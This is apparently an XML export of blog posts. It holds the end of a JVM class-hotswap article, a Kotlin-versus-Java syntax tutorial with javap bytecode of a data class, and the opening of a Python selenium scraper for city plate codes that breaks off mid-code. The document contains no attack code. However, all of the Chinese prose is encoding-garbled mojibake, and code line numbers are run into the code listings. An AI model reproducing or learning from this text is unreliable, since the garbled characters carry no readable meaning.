´ååŒäº²å§”æ´¾æ¨¡å¼ï¼Œè¾¾åˆ°ç›¸å¯¹é«˜çº§çš„æ“ä½œæ–¹å¼ã€‚åŠ¨æ€æ›¿æ¢JVMä¸­çš„Classè¿˜æœ‰å¾ˆå¤šè¦æ·±å…¥æŒ–çš„åœ°æ–¹ï¼Œåœ¨åŽç»­çš„æ–‡ç« ä¸­ä¼šç»§ç»­è®°å½•ã€‚ ç»“åˆç‰ˆæœ¬æŽ§åˆ¶ï¼Œé€šè¿‡ä»£ç†åŠ¨æ€çš„æ›¿æ¢JVMä¸­çš„Classï¼Œå®žçŽ°é¡¹ç›®ææµ‹çš„é›¶æ‰“åŒ…é›¶éƒ¨ç½²ã€‚æˆ‘ä¼šæŒç»­å®Œå–„æˆ‘çš„â€œé›·ç¥žä¹‹é”¤â€è¿™ä¸ªé¡¹ç›® https://github.com/lanshiqin/Mjolnir æ¬¢è¿ŽStart Fork]]></content>
      <categories>
        <category>JVM</category>
      </categories>
      <tags>
        <tag>JVM</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä½¿ç”¨Kotlinæé«˜å¼€å‘æ•ˆçŽ‡]]></title>
    <url>%2Fa8b16990%2F</url>
    <content type="text"><![CDATA[Kotlinæ˜¯çŽ°ä»£è·¨å¹³å°çš„é™æ€ç±»åž‹ç¨‹åºè®¾è®¡è¯­è¨€ï¼Œä¸ä»…ä»…æ˜¯Androidå®˜æ–¹æ”¯æŒçš„å¼€å‘è¯­è¨€ï¼ŒåŒæ—¶åœ¨WebåŽç«¯ä¹Ÿåœ¨å¤§é‡çš„ä½¿ç”¨ã€‚å°±æˆ‘ç›®å‰çš„å·¥ä½œè€Œè¨€ï¼Œå·²ç»åœ¨å®Œå…¨ä½¿ç”¨Kotlinæ¥ç¼–å†™åŸºäºŽSpring Bootçš„åŽç«¯æœåŠ¡ã€‚ä¸ºä»€ä¹ˆè¦ä½¿ç”¨Kotlinæ¥å¼€å‘åº”ç”¨ï¼Ÿä¸»è¦æ˜¯å› ä¸ºå®ƒç™¾åˆ†ä¹‹ç™¾å…¼å®¹Javaï¼Œå¯ä»¥ç¼–è¯‘æˆJVMçš„å­—èŠ‚ç ã€‚Javaçš„å„ç§ç¬¬ä¸‰æ–¹åº“å’ŒSpringç”Ÿæ€æˆä¸ºä¼ä¸šå¤§åž‹åº”ç”¨å¼€å‘çš„æœ€ä½³æ–¹æ¡ˆï¼Œä½¿ç”¨Kotlinå¯ä»¥æé«˜å¼€å‘æ•ˆçŽ‡ã€‚ ä¹Ÿè®¸æ˜¯ä¸€ä¸ªæ—¶ä»£æµè¡Œä¸€ä¸ªè¯­æ³•ï¼Œå¥½çš„æ¦‚å¿µæ€»ä¼šè¢«æŽ¨è¿›ï¼Œæ— å…³è¯­è¨€ã€‚æœ€è¿‘å¯¹æ¯”äº†åŒæ ·æµè¡Œçš„Goè¯­è¨€ï¼Œå‘çŽ°è¿™ä¸¤è€…çš„è¯­æ³•æœ‰å¼‚æ›²åŒå·¥ä¹‹å¤„ã€‚å°¤å…¶æ˜¯Kotlinç›®å‰è¿˜åœ¨è¯•éªŒé˜¶æ®µçš„åç¨‹å°±å’ŒGoçš„åç¨‹éžå¸¸åƒï¼Œæ›´åƒæ˜¯ç›¸äº’å€Ÿé‰´çš„æ„Ÿè§‰ã€‚kotlinçš„mainå‡½æ•°è¾“å‡ºhelloï¼Œworldéžå¸¸ç²¾ç®€123fun main(args: Array&lt;String&gt;) &#123; println("Hello, world!")&#125; kotlinåŒæ ·å€Ÿé‰´äº†åŠ¨æ€è¯­è¨€ï¼Œå¦‚pythonçš„ä¸€äº›è¯­æ³•æ¯”å¦‚è¦è¿‡æ»¤æŽ‰é›†åˆä¸­èƒ½è¢«2æ•´é™¤çš„æ•°123456fun main(args: Array&lt;String&gt;) &#123; val numbers = listOf(1, 2, 3) println(numbers.filter(::isOdd))&#125;fun isOdd(x: Int) = x % 2 != 0 kotlinæœ‰éžå¸¸å¤šçš„æ–°ç‰¹æ€§ï¼Œå…·ä½“å¯ä»¥æŸ¥é˜…å®˜ç½‘æ•™ç¨‹ï¼Œæ­¤å¤„ä¸å†é‡å¤å•°å—¦ã€‚ å…ˆä»Žå¸¸è§çš„è¯­æ³•è¿›è¡Œåˆ†æžå…³äºŽå˜é‡çš„ä½¿ç”¨Java1String str = null; Kotlin1var str: String?=null ä¹Ÿè®¸ä½ ä¼šè¯´ä»…ä»…æ˜¯æŠŠå˜é‡å£°æ˜Žæ”¾å˜é‡ååŽé¢è€Œå·²ï¼Œæ–¹ä¾¿åœ¨å“ªï¼Ÿé™¤äº†ä¸ç”¨å†™å°å·ä»¥å¤–ï¼Œæˆ‘æ€Žä¹ˆæ„Ÿè§‰è¿˜å¤šå†™äº†ï¼Ÿåˆ«æ€¥ï¼ŒKotlinå¯ä»¥è¿™æ ·1var str = "this is String Test" è‡ªåŠ¨ç±»åž‹æŽ¨æ–­ï¼Œæ— éœ€æ˜¾ç¤ºå£°æ˜Žç±»åž‹ä¹Ÿè®¸ä½ è§‰å¾—è‡ªåŠ¨ç±»åž‹æŽ¨æ–­ä¸è¿‡å¦‚æ­¤ï¼Ÿåˆ«æ€¥ï¼Œçœ‹çœ‹ä¸‹é¢è¿™æ®µä»£ç 123456// èŽ·å–ç”¨æˆ·ä¿¡æ¯é›†åˆval userList = userService.userList// éåŽ†ç”¨æˆ·for (user in userList)&#123; println(user)&#125; è°ƒç”¨userServiceçš„userListæ–¹æ³•ï¼Œå°†è°ƒç”¨çš„è¿”å›žå€¼èµ‹å€¼ç»™å˜é‡userList,æ— éœ€æŒ‡å®šå˜é‡ç±»åž‹ï¼ŒKotlinå°†ä¼šè‡ªåŠ¨æŽ¨æ–­ï¼ŒåŒ…æ‹¬å˜é‡å¾ªçŽ¯æ—¶ä¹Ÿæ— éœ€å£°æ˜Žå˜é‡ç±»åž‹ï¼Œå…¨éƒ¨éƒ½ä¼šè¿›è¡Œè‡ªåŠ¨æŽ¨æ–­ã€‚è°ƒç”¨çš„æ–¹æ³•æ²¡æœ‰å‚æ•°ï¼Œæ‰€ä»¥ç›´æŽ¥å†™æ–¹æ³•åå³å¯ã€‚å¦‚æžœæ˜¯Javaï¼Œä½ éœ€è¦è¿™æ ·å†™1234List&lt;User&gt; userList = userService.getUserList();for (User user : userList)&#123; System.out.println(user);&#125; Javaéœ€è¦ä¸ºæŽ¥æ”¶çš„å˜é‡æŒ‡å®šå˜é‡ç±»åž‹ï¼Œä½ è§‰å¾—è¿˜ä¸å¤Ÿï¼ŸæŽ¥ç€å¾€ä¸‹çœ‹ å…³äºŽæ–¹æ³•çš„ä½¿ç”¨åœ¨javaä¸­ï¼Œå®šä¹‰ä¸€ä¸ªæ–¹æ³•å¹¶ä¸”è¿”å›žå­—ç¬¦ä¸²123public String getInfoString()&#123; return "this is String Test";&#125; åœ¨kotlinä¸­123fun getInfoString(): String &#123; return "this is String Test"&#125; Kotlinä½¿ç”¨funå…³é”®å­—å®šä¹‰ä¸€ä¸ªæ–¹æ³•ï¼Œæ–¹æ³•è¿”å›žç±»åž‹åœ¨æ–¹æ³•çš„æ‹¬å·åŽé¢ç”¨ ï¼šåŠ ç±»åž‹ä¹Ÿè®¸ä½ ä¼šè§‰å¾—è¿™å’ŒJavaæ²¡å·®å¤šå°‘å•Šï¼Œåˆ«æ€¥ï¼ŒKotlinè¿˜å¯ä»¥è¿™æ ·1fun getInfoString() = "this is String Test" æ–¹æ³•ä¹Ÿæ”¯æŒè‡ªåŠ¨ç±»åž‹æŽ¨æ–­ï¼Œå¤Ÿç²¾ç®€äº†å§ï¼Ÿä»€ä¹ˆï¼Ÿè¿˜ä¸å¤Ÿç²¾ç®€ï¼Ÿé‚£å†å¯¹æ¯”ä¸€ä¸‹javaå’Œkotlinæ¯”è¾ƒä¸¤ä¸ªæ•°çš„å¤§å°ï¼Œè¿”å›žå¤§çš„é‚£ä¸ªæ•°12345678// è€å®žäººçš„å†™æ³•public int max(int a, int b)&#123; if (a&gt;b)&#123; return a; &#125;else&#123; return b; &#125;&#125; kotlinçš„å†™æ³•1fun max(a: Int, b: Int) = if (a &gt; b) a else b é™¤äº†æ–¹æ³•è¿”å›žå€¼ç±»åž‹è‡ªåŠ¨æŽ¨æ–­ï¼Œè¿žæµç¨‹æŽ§åˆ¶è¯­å¥é‡Œçš„retrunéƒ½ä¸éœ€è¦ä¹Ÿè®¸ä½ è§‰å¾—ä¹Ÿå°±ä¸€èˆ¬èˆ¬ï¼Ÿè¿˜ä¸å¤Ÿï¼Ÿé‚£å°±æŽ¥ç€å¾€ä¸‹çœ‹ æµç¨‹æŽ§åˆ¶è¯­å¥123456789101112131415161718192021public static void main(String[] args) &#123; String language; if (args.length == 0) &#123; language = "EN"; &#125; else &#123; language = args[0]; &#125; switch (language) &#123; case "EN": System.out.println("Hello!"); break; case "CN": System.out.println("ä½ å¥½"); break; default: System.out.println("æŠ±æ­‰ï¼Œæ”¯æŒå½“å‰è¯­è¨€" + language + "çš„è¾“å‡º"); break; &#125; &#125; åœ¨javaä¸­ï¼Œä½ ä¼šå‘çŽ°ä½ å†™äº†å¾ˆå¤šé‡å¤çš„ä»£ç ï¼Œæ¯”å¦‚caseå’Œbreakå…³é”®å­—ï¼Œå¹¶ä¸”æ•´ä¸ªä»£ç å˜å¾—éžå¸¸çš„æ²‰é•¿ã€‚Kotlinå¯ä»¥è¿™ä¹ˆå†™12345678fun main(args: Array&lt;String&gt;)&#123; val language = if (args.isEmpty()) "EN" else args[0] println(when (language)&#123; "EN" -&gt; "Hello!" "CN" -&gt; "ä½ å¥½!" else -&gt; "æŠ±æ­‰ï¼Œæ”¯æŒå½“å‰è¯­è¨€$language çš„è¾“å‡º" &#125;)&#125; Kotlinä½¿ç”¨whenä»£æ›¿Javaä¸­çš„switchè¯­å¥ï¼ŒcaseåŒ¹é…å¯ä»¥å’Œlambadaè¡¨è¾¾å¼ä¸€æ ·ç²¾ç®€çš„å†™æ³•ï¼Œå¯ä»¥åœ¨printlnä¸­ç›´æŽ¥è¾“å‡ºæ•´ä¸ªè¡¨è¾¾å¼ï¼Œå­—ç¬¦ä¸²å†…éƒ¨å¯ä»¥ä½¿ç”¨ç¾Žå…ƒç¬¦å·$åŠ å˜é‡åè¿›è¡Œå˜é‡è¡¨è¾¾å¼è¾“å‡ºã€‚ ä¹Ÿè®¸ä½ è§‰å¾—å…¶å®žä¹Ÿå°±è¿™æ ·è€Œå·²ï¼Ÿé‚£ç»§ç»­å¾€ä¸‹çœ‹ï¼123456789fun cases(obj: Any)&#123; when(obj)&#123; 1 -&gt; println("One") "Hello" -&gt; println("ä½ å¥½") is Long -&gt; println("Long") !is String -&gt; println("ä¸æ˜¯å­—ç¬¦ä¸²") else -&gt; println("æœªçŸ¥") &#125;&#125; åœ¨Kotlinä¸­ä½¿ç”¨Anyè¡¨ç¤ºObjectç±»åž‹ï¼Œwhenè¯­å¥æ¯”javaçš„switchè¯­å¥è¦å¼ºå¤§å¾ˆå¤šã€‚å¦‚æžœæ˜¯Javaä¸­åŽ»åšåŒ¹é…Objectç±»åž‹çš„æ“ä½œ,éœ€è¦swtich caseä¸­ç”¨instanceofåŽ»åŒ¹é…ï¼Œjavaä»£ç æˆ‘å·²ç»æ— åŠ›å†™ä¸‹åŽ»äº†1//javaç•¥... ä¸‹é¢æ¥åˆ†æžä¸»è¦çš„å‡ ä¸ªéƒ¨åˆ†ï¼ŒKotlinç®€æ´è¯­æ³•çš„èƒŒåŽåˆ°åº•ä¸ºæˆ‘ä»¬åšäº†ä»€ä¹ˆï¼ŸKotlinç¼–è¯‘æˆJVMå­—èŠ‚ç åŽåˆ°åº•æ˜¯ä»€ä¹ˆæ ·çš„ï¼Ÿå…³äºŽç®€å•çš„è¯­æ³•ç³–æˆ‘ä»¬å¯ä»¥ç›´æŽ¥åœ¨IDEAä¸€å±‚ä¸€å±‚å¾€ä¸‹ç¿»ï¼Œå¦å¤–ä¸€äº›ç¼–è¯‘æ—¶ç”Ÿæˆçš„åˆ™éœ€è¦é€šè¿‡åç¼–è¯‘å­—èŠ‚ç ã€‚ æŽ¥ä¸‹æ¥åˆ†æžä¸€ä¸ªä¾‹å­ï¼šç”¨Javaæ¥å†™ä¸€ä¸ªPOJOç±»ï¼Œç±»é‡Œé¢æœ‰3ä¸ªç§æœ‰çš„æˆå‘˜å˜é‡ï¼Œç„¶åŽè¦æä¾›å…¬å…±çš„get\setæ–¹æ³•ã€‚User.java123456789101112131415161718192021222324252627282930313233343536373839public class User &#123; /** * å§“å */ private String name; /** * æ€§åˆ« */ private String sex; /** * å¹´é¾„ */ private Integer age; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public String getSex() &#123; return sex; &#125; public void setSex(String sex) &#123; this.sex = sex; &#125; public Integer getAge() &#123; return age; &#125; public void setAge(Integer age) &#123; this.age = age; &#125;&#125; é€šè¿‡å±žæ€§ç§æœ‰ï¼Œæ–¹æ³•å…¬å¼€çš„æ–¹å¼æ¥å¯¹ç±»è¿›è¡Œå°è£…ï¼Œä»£ç å¾ˆå¤šï¼Œè€Œä¸”å¾ˆç¹çæœ‰æ²¡æœ‰ï¼Ÿè™½ç„¶get/setå¯ä»¥è‡ªåŠ¨ç”Ÿæˆï¼Œä½†å…¶å®žè¿™ç§æ¨¡æ¿åŒ–çš„ä»£ç å¹²è„†å°±ä¸è¦å‡ºçŽ°åœ¨ä»£ç é‡Œï¼Œé™¤éžè¦å•ç‹¬å°è£…æŸä¸ªå±žæ€§å€¼ ä½¿ç”¨Kotlinæ¥å†™POJOç±»å°±å˜å¾—éžå¸¸ç²¾ç®€ï¼Œåªéœ€è¦å‡ è¡Œå°±å¯ä»¥äº†ï¼Œåœ¨ç±»å‰ä½¿ç”¨dataå…³é”®å­—ä¿®é¥°ï¼Œç±»ä½“ç”¨()å°æ‹¬å·åŒ…è£¹ï¼Œé‡Œé¢å®šä¹‰æˆå‘˜å˜é‡å³å¯ã€‚ç¼–è¯‘åŽçš„classæ–‡ä»¶ä¼šè‡ªåŠ¨ä¸ºæˆ‘ä»¬æ·»åŠ ä¸Šå±žæ€§çš„get/setæ–¹æ³•ï¼Œå¹¶ä¸”é‡å†™toString()ã€hashCode()ã€equals()æ–¹æ³•ï¼Œä»¥åŠæž„é€ å‡½æ•°å’Œä¸€äº›ç‰¹æ®Šæ–¹æ³•ã€‚User.kt12345data class User( var name: String?=null, var sex: String?=null, var age: Int?=null) å£è¯´æ— å‡­ï¼Œä½ è¯´æœ‰get/setå°±çœŸçš„æœ‰?çœŸçš„ä¼šç”Ÿæˆå¸¦å‚å’Œæ— å‚çš„æž„é€ å‡½æ•°ï¼Ÿå‡­ä»€ä¹ˆï¼Ÿä¸ºäº†ä¸€æŽ¢ç©¶ç«Ÿï¼ŒæŽ¥ä¸‹æ¥ç›´æŽ¥åç¼–è¯‘classå­—èŠ‚ç ï¼Œçœ‹çœ‹Kotlinå†™çš„ä»£ç å¯¹åº”çš„JVMå­—èŠ‚ç åˆ°åº•æ˜¯ä»€ä¹ˆæ ·çš„ ä¸ºäº†ç¿»éæŸ¥çœ‹å¯¹åº”ç±»çš„ä¿¡æ¯ï¼Œè¿™é‡Œä½¿ç”¨javap -c å¹¶å°†classæ–‡ä»¶åç¼–è¯‘åŽçš„æ•°æ®è¾“å‡ºåˆ°ä¸€ä¸ªtxtæ–‡ä»¶ä¸Š1javap -c User.class &gt; User.txt åç¼–è¯‘åŽçš„classå­—èŠ‚ç æ–‡ä»¶ User.txtå†…å®¹å¦‚ä¸‹123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248Compiled from "User.kt"public final class com.lanshiqin.springboot.User &#123; public final java.lang.String getName(); Code: 0: aload_0 1: getfield #11 // Field name:Ljava/lang/String; 4: areturn public final void setName(java.lang.String); Code: 0: aload_0 1: aload_1 2: putfield #11 // Field name:Ljava/lang/String; 5: return public final java.lang.String getSex(); Code: 0: aload_0 1: getfield #20 // Field sex:Ljava/lang/String; 4: areturn public final void setSex(java.lang.String); Code: 0: aload_0 1: aload_1 2: putfield #20 // Field sex:Ljava/lang/String; 5: return public final java.lang.Integer getAge(); Code: 0: aload_0 1: getfield #27 // Field age:Ljava/lang/Integer; 4: areturn public final void setAge(java.lang.Integer); Code: 0: aload_0 1: aload_1 2: putfield #27 // Field age:Ljava/lang/Integer; 5: return public com.lanshiqin.springboot.User(java.lang.String, java.lang.String, java.lang.Integer); Code: 0: aload_0 1: invokespecial #34 // Method java/lang/Object."&lt;init&gt;":()V 4: aload_0 5: aload_1 6: putfield #11 // Field name:Ljava/lang/String; 9: aload_0 10: aload_2 11: putfield #20 // Field sex:Ljava/lang/String; 14: aload_0 15: aload_3 16: putfield #27 // Field age:Ljava/lang/Integer; 19: return public com.lanshiqin.springboot.User(java.lang.String, java.lang.String, java.lang.Integer, int, kotlin.jvm.internal.DefaultConstructorMarker); Code: 0: iload 4 2: iconst_1 3: iand 4: ifeq 12 7: aconst_null 8: checkcast #37 // class java/lang/String 11: astore_1 12: iload 4 14: iconst_2 15: iand 16: ifeq 24 19: aconst_null 20: checkcast #37 // class java/lang/String 23: astore_2 24: iload 4 26: iconst_4 27: iand 28: ifeq 36 31: aconst_null 32: checkcast #39 // class java/lang/Integer 35: astore_3 36: aload_0 37: aload_1 38: aload_2 39: aload_3 40: invokespecial #41 // Method "&lt;init&gt;":(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;)V 43: return public com.lanshiqin.springboot.User(); Code: 0: aload_0 1: aconst_null 2: aconst_null 3: aconst_null 4: bipush 7 6: aconst_null 7: invokespecial #43 // Method "&lt;init&gt;":(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;ILkotlin/jvm/internal/DefaultConstructorMarker;)V 10: return public final java.lang.String component1(); Code: 0: aload_0 1: getfield #11 // Field name:Ljava/lang/String; 4: areturn public final java.lang.String component2(); Code: 0: aload_0 1: getfield #20 // Field sex:Ljava/lang/String; 4: areturn public final java.lang.Integer component3(); Code: 0: aload_0 1: getfield #27 // Field age:Ljava/lang/Integer; 4: areturn public final com.lanshiqin.springboot.User copy(java.lang.String, java.lang.String, java.lang.Integer); Code: 0: new #2 // class com/lanshiqin/springboot/User 3: dup 4: aload_1 5: aload_2 6: aload_3 7: invokespecial #41 // Method "&lt;init&gt;":(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;)V 10: areturn public static com.lanshiqin.springboot.User copy$default(com.lanshiqin.springboot.User, java.lang.String, java.lang.String, java.lang.Integer, int, java.lang.Object); Code: 0: iload 4 2: iconst_1 3: iand 4: ifeq 12 7: aload_0 8: getfield #11 // Field name:Ljava/lang/String; 11: astore_1 12: iload 4 14: iconst_2 15: iand 16: ifeq 24 19: aload_0 20: getfield #20 // Field sex:Ljava/lang/String; 23: astore_2 24: iload 4 26: iconst_4 27: iand 28: ifeq 36 31: aload_0 32: getfield #27 // Field age:Ljava/lang/Integer; 35: astore_3 36: aload_0 37: aload_1 38: aload_2 39: aload_3 40: invokevirtual #53 // Method copy:(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;)Lcom/lanshiqin/springboot/User; 43: areturn public java.lang.String toString(); Code: 0: new #56 // class java/lang/StringBuilder 3: dup 4: invokespecial #57 // Method java/lang/StringBuilder."&lt;init&gt;":()V 7: ldc #59 // String User(name= 9: invokevirtual #63 // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder; 12: aload_0 13: getfield #11 // Field name:Ljava/lang/String; 16: invokevirtual #63 // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder; 19: ldc #65 // String , sex= 21: invokevirtual #63 // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder; 24: aload_0 25: getfield #20 // Field sex:Ljava/lang/String; 28: invokevirtual #63 // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder; 31: ldc #67 // String , age= 33: invokevirtual #63 // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder; 36: aload_0 37: getfield #27 // Field age:Ljava/lang/Integer; 40: invokevirtual #70 // Method java/lang/StringBuilder.append:(Ljava/lang/Object;)Ljava/lang/StringBuilder; 43: ldc #72 // String ) 45: invokevirtual #63 // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder; 48: invokevirtual #74 // Method java/lang/StringBuilder.toString:()Ljava/lang/String; 51: areturn public int hashCode(); Code: 0: aload_0 1: getfield #11 // Field name:Ljava/lang/String; 4: dup 5: ifnull 14 8: invokevirtual #78 // Method java/lang/Object.hashCode:()I 11: goto 16 14: pop 15: iconst_0 16: bipush 31 18: imul 19: aload_0 20: getfield #20 // Field sex:Ljava/lang/String; 23: dup 24: ifnull 33 27: invokevirtual #78 // Method java/lang/Object.hashCode:()I 30: goto 35 33: pop 34: iconst_0 35: iadd 36: bipush 31 38: imul 39: aload_0 40: getfield #27 // Field age:Ljava/lang/Integer; 43: dup 44: ifnull 53 47: invokevirtual #78 // Method java/lang/Object.hashCode:()I 50: goto 55 53: pop 54: iconst_0 55: iadd 56: ireturn public boolean equals(java.lang.Object); Code: 0: aload_0 1: aload_1 2: if_acmpeq 59 5: aload_1 6: instanceof #2 // class com/lanshiqin/springboot/User 9: ifeq 61 12: aload_1 13: checkcast #2 // class com/lanshiqin/springboot/User 16: astore_2 17: aload_0 18: getfield #11 // Field name:Ljava/lang/String; 21: aload_2 22: getfield #11 // Field name:Ljava/lang/String; 25: invokestatic #86 // Method kotlin/jvm/internal/Intrinsics.areEqual:(Ljava/lang/Object;Ljava/lang/Object;)Z 28: ifeq 61 31: aload_0 32: getfield #20 // Field sex:Ljava/lang/String; 35: aload_2 36: getfield #20 // Field sex:Ljava/lang/String; 39: invokestatic #86 // Method kotlin/jvm/internal/Intrinsics.areEqual:(Ljava/lang/Object;Ljava/lang/Object;)Z 42: ifeq 61 45: aload_0 46: getfield #27 // Field age:Ljava/lang/Integer; 49: aload_2 50: getfield #27 // Field age:Ljava/lang/Integer; 53: invokestatic #86 // Method kotlin/jvm/internal/Intrinsics.areEqual:(Ljava/lang/Object;Ljava/lang/Object;)Z 56: ifeq 61 59: iconst_1 60: ireturn 61: iconst_0 62: ireturn&#125; å¯ä»¥çœ‹åˆ°ä½¿ç”¨dataä¿®é¥°çš„POJOç±»çš„Kotlinä»£ç ç¼–è¯‘åŽï¼Œä¸ä»…ä»…é»˜è®¤ä¸ºæˆ‘ä»¬ç”Ÿæˆäº†get/setæ–¹æ³•ï¼Œè¿˜é‡å†™äº†toString()ã€hashCode()ã€equals()æ–¹æ³•,è¿˜æœ‰æž„é€ å‡½æ•°å’Œç‰¹æœ‰çš„æ–¹æ³•ï¼Œå¦å¤–æˆ‘ä»¬è¿˜å‘çŽ°äº†ç±»å’Œæ‰€æœ‰çš„æ–¹æ³•é»˜è®¤éƒ½æ˜¯ä½¿ç”¨finalä½œä¸ºä¿®é¥°ç¬¦çš„ï¼Œè¿™äº›ç‰¹æ€§å¯¹äºŽå¿«é€Ÿå¼€å‘éžå¸¸æœ‰ç”¨ã€‚å…¶ä½™çš„å­—èŠ‚ç æŒ‡ä»¤éƒ¨åˆ†åŽç»­å†åˆ†æžï¼ŒæŒ–ä¸ªå‘ï¼Œä»Šå¤©å…ˆå†™åˆ°è¿™ã€‚]]></content>
      <categories>
        <category>éšç¬”</category>
      </categories>
      <tags>
        <tag>Kotlin</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä½¿ç”¨Pythonè‡ªåŠ¨åŒ–èŽ·å–å…¨å›½æ¯ä¸ªåŸŽå¸‚çš„è½¦ç‰Œä»£ç ]]></title>
    <url>%2F675a168f%2F</url>
    <content type="text"><![CDATA[æœ€è¿‘æœ‰è¿™æ ·ä¸€éœ€æ±‚ï¼Œéœ€è¦èŽ·å–12123äº¤ç®¡æŸ¥è¯¢ç½‘ç«™ä¸Šçš„å…¨å›½æ¯ä¸ªåŸŽå¸‚å¯¹åº”çš„åŸŽå¸‚idå’Œè½¦ç‰Œä»£ç ã€‚æœ€åˆçš„æƒ³æ³•æ˜¯ç›´æŽ¥ç”¨Pythonå†™ä¸ªçˆ¬è™«ï¼ŒéåŽ†æ¯ä¸ªåŸŽå¸‚ï¼Œç„¶åŽç”¨Xpathæå–DOMèŠ‚ç‚¹æ•°æ®å°±å¥½äº†ã€‚ç„¶è€Œåœ¨å®žé™…æ“ä½œä¸­å‘çŽ°åŸŽå¸‚idçš„DOMèŠ‚ç‚¹å¦‚æžœç”¨ç®€å•çš„èŽ·å–ç½‘é¡µæ•°æ®çš„çˆ¬è™«æ˜¯å–ä¸åˆ°idå€¼çš„ï¼Œè¿™ä¸ªåŸŽå¸‚idå€¼å¿…é¡»ç”¨æµè§ˆå™¨æ‰“å¼€çš„æ–¹å¼åŽ»è®¿é—®ï¼Œç„¶åŽç½‘ç«™çš„jsè„šæœ¬å†åŠ¨æ€çš„å°†åŸŽå¸‚idæ’å…¥DOMèŠ‚ç‚¹ã€‚äºŽæ˜¯ä¹Žæƒ³åˆ°äº†ç”¨è‡ªåŠ¨åŒ–æµ‹è¯•å·¥å…·æ¥åšï¼Œä½¿ç”¨seleniumåº“æ¥æ“ä½œwebdriverï¼Œé©±åŠ¨Chromeæµè§ˆå™¨è¿›è¡Œè‡ªåŠ¨åŒ–æ“ä½œã€‚ ç”±äºŽè¿™ä¸ªç½‘ç«™æœ‰ä¸€ç‚¹ç‰¹æ®Šï¼Œå¹¶æ²¡æœ‰åœ¨åŒä¸€ä¸ªé¡µé¢ä¸­æœ‰å…¨éƒ¨åŸŽå¸‚çš„idå’Œè½¦ç‰Œä»£ç ï¼Œæ¯ä¸ªåŸŽå¸‚éƒ½æ˜¯ä¸€ä¸ªå•ç‹¬çš„äºŒçº§åŸŸåé“¾æŽ¥ã€‚å¹¶ä¸”åŸŽå¸‚idä½¿ç”¨jsåŠ¨æ€åŠ è½½ï¼Œæ‰€ä»¥è¿™é‡Œå°±ç”¨è ¢ä¸€ç‚¹çš„æ–¹æ³•ï¼Œè‡ªåŠ¨èŽ·å–åˆ°æ¯ä¸ªåŸŽå¸‚çš„é“¾æŽ¥,ç„¶åŽç”¨æµè§ˆå™¨è‡ªåŠ¨åŒ–æ¨¡å¼åŽ»é€ä¸ªè®¿é—®å†Xpathæå–å‡ºå†…å®¹ã€‚ å½“ç„¶ï¼Œè¿™é‡Œçš„é‡å¤åŠ³åŠ¨åŠ›äº¤ç»™è®¡ç®—æœºå°±å¥½ï¼Œæˆ‘ä»¬åªéœ€è¦æŠŠç¨‹åºå†™å¥½ã€‚ ä½¿ç”¨Chromeæµè§ˆå™¨æ‰“å¼€12123çš„åŸŽå¸‚åˆ—è¡¨é€‰æ‹©é¡µé¢ http://m.12123.com/city.htmlå³é”®ï¼Œå®¡æŸ¥å…ƒç´ ï¼Œå‘çŽ°æ‰€æœ‰çš„åŸŽå¸‚éƒ½åœ¨ul çš„ liæ ‡ç­¾ä¸‹ã€‚åªéœ€è¦æŠŠliçš„å…ƒç´ Xpathæ‹·è´å‡ºæ¥ï¼Œæå–åˆ°åŸŽå¸‚åˆ—è¡¨åŽéåŽ†æ¯ä¸ªåˆ—è¡¨çš„é“¾æŽ¥ï¼Œå†ç”¨æµè§ˆå™¨è‡ªåŠ¨åŒ–åŽ»è®¿é—®æ¯ä¸ªåŸŽå¸‚çš„é“¾æŽ¥ï¼Œæœ€åŽç”¨ç›¸åŒçš„æ–¹æ³•æå–å‡ºæ•°æ®å³å¯ã€‚æ‹·è´å‡ºæ¥çš„Xpathå¦‚ä¸‹1/html/body/div[2]/div[3]/ul/li ç”¨Xpathçš„æ–¹å¼æœ‰ä¸ªå¥½å¤„å°±æ˜¯ä¸éœ€è¦å†™å¤æ‚çš„æ­£åˆ™è¡¨è¾¾å¼å°±å¯ä»¥å¿«é€Ÿæå–åˆ°DOMå…ƒç´ çš„æ•°æ®ã€‚ æˆ‘è¦å®žçŽ°çš„åŠŸèƒ½ï¼š è‡ªåŠ¨èŽ·å–å…¨å›½æ‰€æœ‰çš„åŸŽå¸‚å¯¹åº”çš„idå’Œè½¦ç‰Œä»£ç  å°†èŽ·å–åˆ°çš„æ•°æ®å†™å…¥åˆ°æ–‡ä»¶ï¼Œè¾“å‡ºä¸ºSQLçš„insertè¯­å¥ å…¨éƒ¨ä»£ç å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162"""12123.com äº¤ç®¡æŸ¥è¯¢åŠ©æ‰‹èŽ·å–æ‰€æœ‰çš„ åŸŽå¸‚åç§°+åŸŽå¸‚è½¦ç‰Œä»£ç +åŸŽå¸‚idç”ŸæˆSQL insertè¯­å¥create by è“å£«é’¦ 2018-06-10"""import requestsfrom lxml import etreefrom selenium import webdriverimport datetime# 12123.com äº¤ç®¡æŸ¥è¯¢ç½‘ç«™ç§»åŠ¨ç‰ˆç½‘å€HOST_URL = 'http://m.12123.com'def get_city_info(file_name): # è¯·æ±‚åŸŽå¸‚åˆ—è¡¨é¡µé¢ï¼Œå¹¶ç”¨xpathæå–æ‰€æœ‰çš„åŸŽå¸‚åˆ—è¡¨é›†åˆ html = requests.get(HOST_URL + '/city.html') select = etree.HTML(html.text) content = 